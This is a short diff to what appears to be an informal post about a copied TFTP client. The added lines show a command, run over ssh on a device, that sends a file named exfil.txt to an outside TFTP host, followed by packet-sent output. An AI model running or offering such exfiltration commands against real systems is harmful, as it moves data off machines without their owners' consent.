@@ -15,6 +15,20 @@ Comment: the compiled file may be really helpful since you read the Post and now
 
 none of that stuff was working and I just copy pasta the tftp client so could get that gzfile and see wtf is happening..
 
+Putting it all together.. 
+you'll be ssh into /dev/thingy
+
+./client -h tftp.xss.cx -p 69 -f exfil.txt
+
+...
+...
+Packet '143966' sent
+Packet '143967' sent
+Packet '143968' sent
+Packet '143969' sent
+FIN '143970' sent
+Goodbye
+
 
 
 
